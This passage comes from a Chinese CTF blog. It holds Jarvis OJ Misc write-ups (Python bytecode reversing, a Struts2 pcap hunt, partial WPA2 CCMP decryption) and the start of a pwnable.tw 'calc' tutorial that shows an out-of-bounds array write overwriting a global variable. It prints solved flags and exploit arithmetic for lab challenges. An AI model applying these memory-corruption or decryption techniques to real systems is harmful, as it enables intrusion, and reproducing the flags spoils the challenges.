class="string">'eJxtVP9r21YQvyd/ieWm66Cd03QM1B8C3pggUuzYCSWstHSFQijyoJBhhGq9OXJl2ZFeqAMOK6Q/94f9Ofvn1s+d7Lgtk/3O997du/vc584a0eqpYP2GVfwDEeOrKCU6g2LRRyiK4oooFsVVUSqkqxTX6J1F+SfSNYrrdKPorC76luhbpOEGCZNFZw2KG3Rmk26QtuXi3xTb7ND6/aVu0g2RuvhEcZNut5lAGbTvAFbyH57TkYLKy8J6xpDvQxiiiaIlcdqJxVcHbXY6bXNlZgviPCrO0+StqfKd88gzNh/qRZyMdWHE29TZZvIkG7eZFRGGRcBmsXJaUoKCQ9fWKHwSqNeKFnsM5PnwJ7q2aKk4AFhcWtQCh+ChB5+Lu/RmyYUxmtOEYxas7i/2iuR7Ti14OEOSmU0RADd4+dQzbM1FJhukAUeQ+kZROuLyioagrau76kc1slY1NNaY/y3LAxDQBrAICJisV2hMdF2lxQcyFuMoqcX3+TCl6xotqzSpkqmxYVmjXVjAXiwBsEfBrd1VvTvLCj2EXRnhoryAKdpxcIgJcowUB68yAx/tlCAuPHqDuZo0CN3CUGHwkPhGMA7aXMfphjbmQLhLhJcHa0a+mpgB191c1U1lnHJQbgkHx+WGxeJbejnpkzSavo2jkxZ7i725npGAaTc8FXmUjbUETHUmkxXN5zqL5WiWxwE7Bc11yyYzNJpN02jerq+DzNNodfxOX8kE4FcmYKscDdYD1oPGGucXYNmgs1F+NTf3GOt3Mg7b+NTVruqoQyX1hOEUacKw+AGbP38ZOq9THRXaSbL5pXGQ8bho/Z/lrzQaHxdoCrlev+t6nZ7re57r+57rHXag93Deh37k+vuw9zorO/Qj/B50cAf2oyOsvut3D+ADWxdxfN/1Drqu39mHzvcRswv/Hvz7sHeg9w8Qzy99DzuFwxhPhs6zWTbOI3OZRiaZZcVj5wVwOklx7OwVxR47PR46r/SVM8ulBJic9zku/eqY/MqJxiDj+Gd55wS3f35pbLCzHoEwzKKpDkN5i+TR+1AYCWTo5IV0Z0P9H3phDDd6lMzPdS5bbo9eJGbTsW9nbDqLL1N9Iq+rRxDbll2x67a9Lf27hw5uK1s1rZr6DOPF+FI='</span>))</span><br><span class="line">to_pyc(code,<span class="string">"dump.pyc"</span>)</span><br></pre></td></tr></table></figure><p>然后使用 uncompyle6 将pyc反编译乘py文件:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">➜  you_need_python uncompyle6 ./dump.pyc &gt;source.py</span><br><span class="line">➜  you_need_python cat ./source.py</span><br><span class="line"><span class="comment"># uncompyle6 version 3.3.1</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.7.1 (default, Nov  6 2018, 18:46:03)</span></span><br><span class="line"><span class="comment"># [Clang 10.0.0 (clang-1000.11.45.5)]</span></span><br><span class="line"><span class="comment"># Compiled at: 2019-04-23 15:00:53</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(string).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(strSHA1)</span>:</span></span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strSHA1:</span><br><span class="line">        r += int(<span class="string">'0x%s'</span> % i, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plain, key)</span>:</span></span><br><span class="line">    keySHA1 = sha1(key)</span><br><span class="line">    intSHA1 = calc(keySHA1)</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line">        r.append(ord(plain[i]) + int(<span class="string">'0x%s'</span> % keySHA1[i % <span class="number">40</span>], <span class="number">16</span>) - intSHA1)</span><br><span class="line">        intSHA1 = calc(sha1(plain[:i + <span class="number">1</span>])[:<span class="number">20</span>] + sha1(str(intSHA1))[:<span class="number">20</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="string">''</span>).join(map(<span class="keyword">lambda</span> x: str(x), r))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    key = raw_input(<span class="string">'[*] Please input key:'</span>)</span><br><span class="line">    plain = raw_input(<span class="string">'[*] Please input flag:'</span>)</span><br><span class="line">    encryptText = encrypt(plain, key)</span><br><span class="line">    cipherText = <span class="string">'-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164'</span></span><br><span class="line">    <span class="keyword">if</span> encryptText == cipherText:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[&gt;] Congratulations! Flag is: %s'</span> % plain</span><br><span class="line">        exit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[!] Key or flag is wrong, try again:)'</span></span><br><span class="line">        exit()</span><br><span class="line"><span class="comment"># okay decompiling ./dump.pyc</span></span><br></pre></td></tr></table></figure><p>我们可以看到key为utf9解出的那串字符串，然后sha1算hash再每一个字符按16进制加起来，那么我们现在知道keySHA和intSHA1，那么flag的第一位就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x + int(keySHA1[0],16) - intSHA1 = -185</span><br></pre></td></tr></table></figure><p>解方程就能求得flag了，所以现在的关键就是解出key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> utf9</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getkey</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./key_is_here_but_do_you_know_rfc4042'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = utf9.utf9decode(f.read())</span><br><span class="line">        f.close()</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#key: _____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)*__+_)**_________+_______*(((_________%_______)*__+_______-(________//________))**_______)+(________/__)*(((____-_+_______)*(______+____))**___)+___*((__+_________-_)**_____)+___*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))**__)+(_//_)*(((________%___%__+_____+_____)%______)+_______-_)**___+_____*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___</span></span><br></pre></td></tr></table></figure><p>一开始以为是xxfuck之类的、、最后查了一下发现就是单纯的下划线的算式，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> utf9</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(string).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(strSHA1)</span>:</span></span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strSHA1:</span><br><span class="line">        r += int(<span class="string">'0x%s'</span> % i, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getkey</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./key_is_here_but_do_you_know_rfc4042'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = utf9.utf9decode(f.read())</span><br><span class="line">        f.close()</span><br><span class="line">    _ = <span class="number">1</span></span><br><span class="line">    __ = <span class="number">2</span></span><br><span class="line">    ___ = <span class="number">3</span></span><br><span class="line">    ____ = <span class="number">4</span></span><br><span class="line">    _____ = <span class="number">5</span></span><br><span class="line">    ______ = <span class="number">6</span></span><br><span class="line">    _______ = <span class="number">7</span></span><br><span class="line">    ________ = <span class="number">8</span></span><br><span class="line">    _________ = <span class="number">9</span></span><br><span class="line">    __________ = <span class="number">0</span></span><br><span class="line">    key = eval(data)</span><br><span class="line">    <span class="keyword">return</span> hex(key)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(key)</span>:</span></span><br><span class="line">    c = <span class="string">'-185-147-211-221-164-217-188-169-205-174-211-225-191-234-148-199-198-253-175-157-222-135-240-229-201-154-178-187-244-183-212-222-164'</span></span><br><span class="line">    c = [int(c[x:x+<span class="number">4</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>,len(c),<span class="number">4</span>)]</span><br><span class="line">    keySHA1 = sha1(key)</span><br><span class="line">    intSHA1 = calc(keySHA1)</span><br><span class="line">    m = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(len(c)):</span><br><span class="line">        m += chr(c[_] + intSHA1 - int(<span class="string">'0x%s'</span> % keySHA1[_ % <span class="number">40</span>], <span class="number">16</span>))</span><br><span class="line">        intSHA1 = calc(sha1(m[:_+<span class="number">1</span>])[:<span class="number">20</span>] + sha1(str(intSHA1))[:<span class="number">20</span>])</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line">key = getkey()</span><br><span class="line"><span class="keyword">print</span> key</span><br><span class="line">m = decrypt(key)</span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line"><span class="comment">#key: I_4m-k3y</span></span><br><span class="line"><span class="comment">#flag&#123;Lif3_i5_5h0r7_U_n33d_Py7h0n&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Struts2漏洞"><a href="#Struts2漏洞" class="headerlink" title="Struts2漏洞"></a>Struts2漏洞</h2><p>一说structs2就想到反序列化，但是本垃圾并不懂java，更别说structs2了，查了一下原理，看到这个<br><a href="https://blog.csdn.net/wpydaguan/article/details/45220025" target="_blank" rel="noopener">https://blog.csdn.net/wpydaguan/article/details/45220025</a></p><p><img src="/images/jarvis-OJ-Misc/208E0EFD-C4A9-4123-81C1-47520A5B071B.png" alt="Struts2漏洞"><br>于是猜测，url里有action关键字，用wireshark的正则匹配一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and !(http.request.uri matches &quot;http://.*\.jpg.*&quot; or http.request.uri matches &quot;http://.*\.gif.*&quot; ) and http.request.uri matches &quot;.*action.*&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/jarvis-OJ-Misc/405853BA-BC58-40AE-9456-61E7A943AB9B.png" alt="Struts漏洞"><br>不多一个个看：</p><p><img src="/images/jarvis-OJ-Misc/22F5B23A-AEEC-43C8-9223-4A2D1CF7ACEF.png" alt="Struts漏洞"><br>FLAG:E3274BE5C857FB42AB72D786E281B4B8</p><h2 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a>WPA2</h2><p>首先nc连上去看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nc pwn.jarvisoj.com 9893</span><br><span class="line">Welcome to HuWang Bei WPA2 Simulation System.. Initilizing Parameters..</span><br><span class="line"></span><br><span class="line">SSID = HuWang</span><br><span class="line"></span><br><span class="line">PSK = eygqW2NkTrmXfV94</span><br><span class="line"></span><br><span class="line">AP_MAC = E2:73:76:65:9A:F0</span><br><span class="line"></span><br><span class="line">AP_Nonce = fa2e6fbd9c1248451fba5f112773528f52907c795d89ba32102e00f60074922e</span><br><span class="line"></span><br><span class="line">STA_MAC = E9:88:69:8F:26:06</span><br><span class="line"></span><br><span class="line">STA_Nonce = 85dd88520e836988028459c710284424a15af2b2884be36623d9d9b8c90cf2ab</span><br><span class="line"></span><br><span class="line">CCMP Encrypted Packet = 88423a01e988698f2606e27376659af0e27376659af060920000319c00200f00000023102cb86f5f401b2333e536a9148311f13b4d31e3c6556b3f0c7f6a3c4d058ce7d0ea87e2131d46a3</span><br><span class="line"></span><br><span class="line">Input decrypted challenge value in Packet:</span><br></pre></td></tr></table></figure><p>google一下，研究了半天懂了一点，WPA2是通过SSID与PSK生成一个PMK，然后通过PMK, AP nonce, STA nonce (SNonce), AP MAC address , and STA MAC address生成PTK，PTK又分为若干部分：<br>EAPOL-Key Confirm Key、EAPOL-Key Encrypt Key用于EAPOL-Key的四次握手，<br>(TKIP|CCMP) Temporal Key 参与报文加密解密<br>TKIP MIC Key(for Authenticator Tx)、TKIP MIC Key(for Supplicant Tx)用于TKIP协议。<br>看到题目给的信息、我估计就是要算那个<code>(TKIP|CCMP) Temporal Key</code>了。<br>首先是通过SSID与PSK计算PMK，这里可以用<a href="http://jorisvr.nl/wpapsk.html" target="_blank" rel="noopener">WPA key calculation: From passphrase to hex</a>也可以自己写个脚本具体的算法可以看 <a href="https://www.ietf.org/rfc/rfc2898.txt" target="_blank" rel="noopener">rfc2898</a> 的PBKDF2那一节…<br>然后我写了一半发现python3有自带的。。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PMK = hashlib.pbkdf2_hmac(<span class="string">"sha1"</span>, PSK.encode(), SSID.encode(), <span class="number">4096</span>, <span class="number">256</span>)</span><br></pre></td></tr></table></figure><p>PTK的算法见<a href="http://ieee802.org/16/liaison/docs/80211-05_0123r1.pdf" target="_blank" rel="noopener">IEEE 802.11-04/0123r1</a> 46页</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">802.11i-PRF(K, A, B, Len) R ← “” for i ← 0 to ((Len+159)/160) – 1) do R ← R || HMAC-SHA1(K, A || B || i) return Truncate-to-len(R, Len)</span><br><span class="line">PTK ← 802.11i-PRF(PMK, “Pairwise key expansion”, min(AP-Addr, STA-Addr) || max(AP-Addr, STA-Addr) || min(ANonce, SNonce) || max( ANonce, SNonce), 384)</span><br></pre></td></tr></table></figure><p>写了脚本计算出了Temporal Key然后还没完的呢。<br>根据<a href="https://tools.ietf.org/html/rfc3610" target="_blank" rel="noopener">RFC 3610 </a>的说法，要解密CCM加密的密文，要提供三个东西，<br>密钥，随机数，附加认证数据，密钥我们已经有了。然后随机数和附加认证数据去哪搞是个问题emmmm。根据<a href="http://ieee802.org/16/liaison/docs/80211-05_0123r1.pdf" target="_blank" rel="noopener">IEEE 802.11-04/0123r1</a> 33页说的</p><ul><li>Needs one fresh 128-bit key – Same 128-bit <ul><li>Temporal key used by both AP and STA </li><li>CBC-MAC IV, CTR constructions make this valid</li></ul></li></ul><ul><li>Nonce (A0, B0) construction in CCMP’s use of CCM:<ul><li>A0 = Tag0 || 0x00 || Transmit-Address || Frame-Sequence-Number </li><li>B0 = Tag1 || 0x00 || Transmit-Address || Frame-Sequence-Number </li><li>Transmit-address is 6 octets</li><li>Frame-Sequence-Number is 8 octets and includes the QoS Priority </li><li>Sequence-Number must be sequential within a single MSDU<br>emmmmmmmmm</li></ul></li></ul><p>未完待续…</p>]]></content>
      
      
      <categories>
          
          <category> CTF wirteup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jarvisOJ </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从pwnable-tw-calc看数组越界造成的任意地址读写</title>
      <link href="/2019/07/09/%E4%BB%8Epwnable-tw-calc%E7%9C%8B%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E9%80%A0%E6%88%90%E7%9A%84%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99/"/>
      <url>/2019/07/09/%E4%BB%8Epwnable-tw-calc%E7%9C%8B%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C%E9%80%A0%E6%88%90%E7%9A%84%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>数组越界访问是c程序常见的错误之一，由于c语言并不向Java等语言对数组下标有严格的检查，一旦出现越界，就有可能造成严重的后果。<br>看下边一个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target = <span class="number">0xdeadbeef</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">20</span>] = &#123;<span class="number">0xdeadbeef</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> index,value;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>,a);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;index, &amp;value);</span><br><span class="line">    a[index] = value;</span><br><span class="line">    <span class="keyword">if</span> (target == <span class="number">0x27</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Congratulations!\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"try again.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以32位为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 Array-out-of-bounds.c -g0 -o 32</span><br></pre></td></tr></table></figure><p>栈空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ esp  0xffffcdb0 —▸ 0x8048634 ◂— and    eax, 0x642564 /* &apos;%d%d&apos; */</span><br><span class="line">01:0004│      0xffffcdb4 —▸ 0xffffcdc4 —▸ 0xf7ffd918 ◂— 0x0</span><br><span class="line">02:0008│      0xffffcdb8 —▸ 0xffffcdc8 —▸ 0xffffcde0 ◂— 0x0</span><br><span class="line">03:000c│      0xffffcdbc ◂— 0x0</span><br><span class="line">04:0010│      0xffffcdc0 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f3c</span><br><span class="line">05:0014│ eax  0xffffcdc4 —▸ 0xf7ffd918 ◂— 0x0</span><br><span class="line">06:0018│      0xffffcdc8 —▸ 0xffffcde0 ◂— 0x0</span><br><span class="line">07:001c│      0xffffcdcc ◂— 0xdeadbeef</span><br><span class="line">08:0020│      0xffffcdd0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">1b:006c│ edi  0xffffce1c ◂— 0xc4907500</span><br><span class="line">1c:0070│      0xffffce20 —▸ 0xffffce40 ◂— 0x1</span><br><span class="line">1d:0074│      0xffffce24 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line">1e:0078│ ebp  0xffffce28 ◂— 0x0</span><br><span class="line">1f:007c│      0xffffce2c —▸ 0xf7e19637 (__libc_start_main+247) ◂— add    esp, 0x10</span><br></pre></td></tr></table></figure><p>此时我们可以看到<code>a</code>的地址为<code>0xffffcdcc</code>而内存访问数组的方法是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x8048549 &lt;main+94&gt;     add    esp, 0x10</span><br><span class="line">0x804854c &lt;main+97&gt;     mov    eax, dword ptr [ebp - 0x64]</span><br><span class="line">0x804854f &lt;main+100&gt;    mov    edx, dword ptr [ebp - 0x60]</span><br><span class="line">0x8048552 &lt;main+103&gt;    mov    dword ptr [ebp + eax*4 - 0x5c], edx</span><br></pre></td></tr></table></figure><p>即 <code>ebp-0x5c</code>为<code>a</code>的地址，再加上<code>eax</code>也就是索引乘4，如果我们要修改<code>target</code>的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x &amp;target</span><br><span class="line">$3 = 0x804a028</span><br></pre></td></tr></table></figure><p>即<code>0xffffcdcc + eax * 4  == 0x804a028</code>解方程。<br>我们因为是32位，所以我们可以把这个方程看成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0xffffcdcc + eax * 4) &amp; 0xffffffff  == 0x804a028</span><br></pre></td></tr></table></figure><p>因为有很多值，我们就取一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: (<span class="number">0x10804a028</span><span class="number">-0xffffcdcc</span>)/<span class="number">4</span></span><br><span class="line">Out[<span class="number">5</span>]: <span class="number">0x2013497</span></span><br></pre></td></tr></table></figure><p>成功修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x target</span><br><span class="line">$6 = 0x27</span><br></pre></td></tr></table></figure><p>退出gdb</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  Array-out-of-bounds ./32          </span><br><span class="line">ffd8e7fc</span><br><span class="line">34270731 39</span><br><span class="line">Congratulations!</span><br></pre></td></tr></table></figure><p>接下来通过pwnable.tw的一道calc实战一下</p><h2 id="0x1-pwnable-tw-calc"><a href="#0x1-pwnable-tw-calc" class="headerlink" title="0x1 pwnable.tw-calc"></a>0x1 pwnable.tw-calc</h2><p>nc连上去看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nc chall.pwnable.tw 10100</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">1+3</span><br><span class="line">4</span><br><span class="line">1-3</span><br><span class="line">-2</span><br><span class="line">2+-2</span><br><span class="line">expression error!</span><br><span class="line">-2+2</span><br><span class="line">2</span><br><span class="line">0+0</span><br><span class="line">prevent division by zero</span><br><span class="line">-0+1</span><br><span class="line">prevent division by zero</span><br><span class="line">+1+1</span><br><span class="line">2</span><br><span class="line">+5-7</span><br><span class="line">-7</span><br><span class="line">Merry Christmas!</span><br></pre></td></tr></table></figure><p>随便输入点什么，可以看到有些奇怪的输出。<br>打开ida加载分析一下、逻辑很简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">calc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result[<span class="number">101</span>]; <span class="comment">// [esp+18h] [ebp-5A0h]</span></span><br><span class="line">  <span class="keyword">char</span> expr; <span class="comment">// [esp+1ACh] [ebp-40Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+5ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(&amp;expr, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !get_expr((<span class="keyword">int</span>)&amp;expr, <span class="number">1024</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    init_pool(result);</span><br><span class="line">    <span class="keyword">if</span> ( parse_expr(&amp;expr, result) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>((<span class="string">"%d\n"</span>, result[result[<span class="number">0</span>] - <span class="number">1</span> + <span class="number">1</span>]);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> 